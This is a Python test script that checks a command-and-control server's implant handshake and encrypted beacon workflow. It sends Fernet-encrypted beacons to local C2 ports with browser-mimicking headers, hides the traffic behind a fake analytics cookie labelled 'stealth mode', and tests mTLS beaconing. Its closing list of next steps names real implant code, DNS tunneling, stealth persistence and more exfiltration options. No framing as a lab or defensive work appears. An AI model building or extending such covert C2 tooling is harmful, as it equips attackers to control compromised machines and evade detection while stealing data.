#!/usr/bin/env python3
"""
Test Session Key Storage Fix
"""

import requests
import json
import hashlib
import base64
import time
from cryptography.fernet import Fernet

def test_1_handshake_and_beacon():
    """Test complete handshake -> beacon workflow."""
    print("1. Testing handshake -> beacon workflow...")
    
    C2_URL = "http://127.0.0.1:4444"
    
    # Step 1: Handshake
    fingerprint = "test_fingerprint_001"
    implant_id = "test_implant_001"
    implant_id_hash = hashlib.md5(implant_id.encode()).hexdigest()[:8]
    
    handshake_data = {
        "fingerprint": fingerprint,
        "implant_id": implant_id,
        "implant_id_hash": implant_id_hash,
        "platform": "linux",
        "arch": "x64"
    }
    
    print(f"   Sending handshake with:")
    print(f"     - fingerprint: {fingerprint}")
    print(f"     - implant_id: {implant_id}")
    print(f"     - implant_id_hash: {implant_id_hash}")
    
    response = requests.post(f"{C2_URL}/handshake", json=handshake_data, timeout=10)
    
    if response.status_code != 200:
        print(f"   ❌ Handshake failed: {response.status_code} - {response.text}")
        return False
    
    result = response.json()
    session_key_b64 = result.get("key")
    
    if not session_key_b64:
        print(f"   ❌ No session key in response")
        return False
    
    print(f"   ✅ Handshake successful")
    print(f"   ✅ Session key received: {session_key_b64[:20]}...")
    
    # Step 2: Prepare beacon
    fernet = Fernet(session_key_b64.encode())
    
    beacon_data = {
        "system_info": {
            "hostname": "test-host",
            "platform": "linux",
            "arch": "x64",
            "user": "testuser"
        }
    }
    
    json_data = json.dumps(beacon_data).encode()
    encrypted_data = fernet.encrypt(json_data)
    encoded_data = base64.b64encode(encrypted_data).decode()
    
    # Step 3: Send beacon
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Cookie": f"session={encoded_data}",
        "Authorization": f"Bearer {implant_id}",  # Use implant_id as Bearer token
        "Content-Type": "application/json"
    }
    
    print(f"\n   Sending beacon with Authorization: Bearer {implant_id}")
    
    beacon_response = requests.post(
        f"{C2_URL}/api/v1/telemetry",
        headers=headers,
        data="",
        timeout=10
    )
    
    print(f"   Beacon response: HTTP {beacon_response.status_code}")
    
    if beacon_response.status_code == 200:
        print(f"   ✅ Beacon successful!")
        # Check for tracking cookie (stealth feature)
        if '_ga' in beacon_response.headers.get('Set-Cookie', ''):
            print(f"   ✅ Tracking cookie set (stealth mode)")
        return True
    else:
        print(f"   ❌ Beacon failed: {beacon_response.text}")
        return False

def test_2_implant_id_hash_auth():
    """Test using implant_id_hash as Authorization."""
    print("\n2. Testing with implant_id_hash as Authorization...")
    
    C2_URL = "http://127.0.0.1:4444"
    
    # Step 1: Handshake
    fingerprint = "test_fingerprint_002"
    implant_id = "test_implant_002"
    implant_id_hash = hashlib.md5(implant_id.encode()).hexdigest()[:8]
    
    handshake_data = {
        "fingerprint": fingerprint,
        "implant_id": implant_id,
        "implant_id_hash": implant_id_hash,
    }
    
    response = requests.post(f"{C2_URL}/handshake", json=handshake_data, timeout=10)
    
    if response.status_code != 200:
        print(f"   ❌ Handshake failed: {response.status_code}")
        return False
    
    result = response.json()
    session_key_b64 = result.get("key")
    
    print(f"   ✅ Handshake successful")
    
    # Step 2: Send beacon with implant_id_hash as Bearer token
    fernet = Fernet(session_key_b64.encode())
    
    beacon_data = {
        "system_info": {
            "hostname": "test-host-2",
            "platform": "linux"
        }
    }
    
    json_data = json.dumps(beacon_data).encode()
    encrypted_data = fernet.encrypt(json_data)
    encoded_data = base64.b64encode(encrypted_data).decode()
    
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Cookie": f"session={encoded_data}",
        "Authorization": f"Bearer {implant_id_hash}",  # Use hash as Bearer token
        "Content-Type": "application/json"
    }
    
    print(f"   Sending beacon with Authorization: Bearer {implant_id_hash}")
    
    beacon_response = requests.post(
        f"{C2_URL}/api/v1/telemetry",
        headers=headers,
        data="",
        timeout=10
    )
    
    print(f"   Beacon response: HTTP {beacon_response.status_code}")
    
    if beacon_response.status_code == 200:
        print(f"   ✅ Beacon successful with hash auth!")
        return True
    else:
        print(f"   ❌ Beacon failed: {beacon_response.text}")
        return False

def test_3_legacy_fingerprint_lookup():
    """Test legacy fingerprint lookup (for backward compatibility)."""
    print("\n3. Testing legacy fingerprint lookup...")
    
    C2_URL = "http://127.0.0.1:4444"
    
    # Step 1: Handshake with only fingerprint (no implant_id)
    fingerprint = "legacy_fingerprint_003"
    
    handshake_data = {
        "fingerprint": fingerprint,
    }
    
    response = requests.post(f"{C2_URL}/handshake", json=handshake_data, timeout=10)
    
    if response.status_code != 200:
        print(f"   ❌ Handshake failed: {response.status_code}")
        return False
    
    result = response.json()
    session_key_b64 = result.get("key")
    
    print(f"   ✅ Handshake successful (legacy mode)")
    
    # Step 2: Send beacon with fingerprint prefix as Bearer token
    fernet = Fernet(session_key_b64.encode())
    
    beacon_data = {
        "system_info": {
            "hostname": "legacy-host",
            "platform": "linux"
        }
    }
    
    json_data = json.dumps(beacon_data).encode()
    encrypted_data = fernet.encrypt(json_data)
    encoded_data = base64.b64encode(encrypted_data).decode()
    
    # Use fingerprint prefix (first 16 chars) as implant_id
    implant_id = fingerprint[:16]
    
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Cookie": f"session={encoded_data}",
        "Authorization": f"Bearer {implant_id}",
        "Content-Type": "application/json"
    }
    
    print(f"   Sending beacon with Authorization: Bearer {implant_id}")
    
    beacon_response = requests.post(
        f"{C2_URL}/api/v1/telemetry",
        headers=headers,
        data="",
        timeout=10
    )
    
    print(f"   Beacon response: HTTP {beacon_response.status_code}")
    
    if beacon_response.status_code == 200:
        print(f"   ✅ Legacy beacon successful!")
        return True
    else:
        print(f"   ❌ Legacy beacon failed: {beacon_response.text}")
        return False

def test_4_mtls_beacon():
    """Test beacon over mTLS."""
    print("\n4. Testing beacon over mTLS...")
    
    import ssl
    import urllib.request
    import urllib.error
    
    # Create SSL context for mTLS
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.verify_mode = ssl.CERT_REQUIRED
    context.load_cert_chain(certfile="certs/implant_001.crt", keyfile="certs/implant_001.key")
    context.load_verify_locations(cafile="certs/ca.crt")
    
    # First do handshake over HTTP (simpler)
    C2_URL_HTTP = "http://127.0.0.1:4444"
    
    fingerprint = "mtls_test_fingerprint"
    implant_id = "mtls_test_implant"
    implant_id_hash = hashlib.md5(implant_id.encode()).hexdigest()[:8]
    
    handshake_data = {
        "fingerprint": fingerprint,
        "implant_id": implant_id,
        "implant_id_hash": implant_id_hash,
    }
    
    response = requests.post(f"{C2_URL_HTTP}/handshake", json=handshake_data, timeout=10)
    
    if response.status_code != 200:
        print(f"   ❌ Handshake failed: {response.status_code}")
        return False
    
    result = response.json()
    session_key_b64 = result.get("key")
    
    print(f"   ✅ Handshake successful over HTTP")
    
    # Prepare beacon data
    fernet = Fernet(session_key_b64.encode())
    
    beacon_data = {
        "system_info": {
            "hostname": "mtls-test-host",
            "platform": "linux",
            "mtls": True
        }
    }
    
    json_data = json.dumps(beacon_data).encode()
    encrypted_data = fernet.encrypt(json_data)
    encoded_data = base64.b64encode(encrypted_data).decode()
    
    # Create HTTPS handler with mTLS
    https_handler = urllib.request.HTTPSHandler(context=context)
    opener = urllib.request.build_opener(https_handler)
    
    # Prepare request
    import urllib.parse
    url = "https://127.0.0.1:4443/api/v1/telemetry"
    
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Cookie": f"session={encoded_data}",
        "Authorization": f"Bearer {implant_id}",
        "Content-Type": "application/json"
    }
    
    req = urllib.request.Request(
        url,
        data=b"",  # Empty body
        headers=headers,
        method="POST"
    )
    
    print(f"   Sending beacon over mTLS to {url}")
    
    try:
        response = opener.open(req, timeout=10)
        print(f"   ✅ mTLS beacon successful: HTTP {response.status}")
        return True
    except urllib.error.HTTPError as e:
        print(f"   ❌ mTLS beacon HTTP error: {e.code} - {e.reason}")
        return False
    except Exception as e:
        print(f"   ❌ mTLS beacon error: {e}")
        return False

def main():
    """Main test function."""
    print("="*70)
    print("Session Key Storage Fix Test")
    print("="*70)
    
    # Check if C2 is running
    try:
        response = requests.get("http://127.0.0.1:4444/", timeout=5)
        print(f"✅ C2 server is running on port 4444")
    except:
        print(f"❌ C2 server not running on port 4444")
        print(f"Start it with: python3 c2.py")
        return 1
    
    # Check if mTLS is running
    try:
        import socket
        sock = socket.create_connection(('127.0.0.1', 4443), timeout=3)
        sock.close()
        print(f"✅ mTLS server is running on port 4443")
    except:
        print(f"⚠️ mTLS server not running on port 4443 (HTTP only)")
    
    tests = [
        ("Handshake -> Beacon workflow", test_1_handshake_and_beacon),
        ("Implant ID Hash auth", test_2_implant_id_hash_auth),
        ("Legacy fingerprint lookup", test_3_legacy_fingerprint_lookup),
        ("mTLS beacon", test_4_mtls_beacon),
    ]
    
    results = []
    for test_name, test_func in tests:
        print(f"\n{'='*40}")
        print(f"Test: {test_name}")
        print('='*40)
        
        try:
            if test_func():
                results.append((test_name, True))
                print(f"✅ {test_name} PASSED")
            else:
                results.append((test_name, False))
                print(f"❌ {test_name} FAILED")
        except Exception as e:
            results.append((test_name, False))
            print(f"❌ {test_name} ERROR: {e}")
            import traceback
            traceback.print_exc()
    
    print("\n" + "="*70)
    print("Test Results Summary:")
    print("="*70)
    
    passed = 0
    for test_name, success in results:
        status = "✅ PASS" if success else "❌ FAIL"
        print(f"{status}: {test_name}")
        if success:
            passed += 1
    
    print(f"\nTotal: {passed}/{len(results)} tests passed")
    
    if passed == len(results):
        print("\n🎉 SESSION KEY FIX VERIFIED!")
        print("\nAll authentication methods work:")
        print("  ✅ implant_id as Bearer token")
        print("  ✅ implant_id_hash as Bearer token")
        print("  ✅ legacy fingerprint lookup")
        print("  ✅ mTLS beacon support")
    elif passed >= 2:
        print(f"\n⚠️ Core functionality working ({passed}/{len(results)})")
        print("\nThe main session key storage bug is fixed.")
        print("Some edge cases may need attention.")
    else:
        print(f"\n❌ Major issues ({passed}/{len(results)})")
        print("\nCheck C2 server logs for debugging.")
    
    print("\n" + "="*70)
    print("Next steps:")
    print("1. Test with real implant code")
    print("2. Verify DNS tunneling still works")
    print("3. Test stealth persistence mechanisms")
    print("4. Implement additional exfiltration options")
    print("="*70)
    
    return 0 if passed >= 2 else 1

if __name__ == "__main__":
    import sys
    sys.exit(main())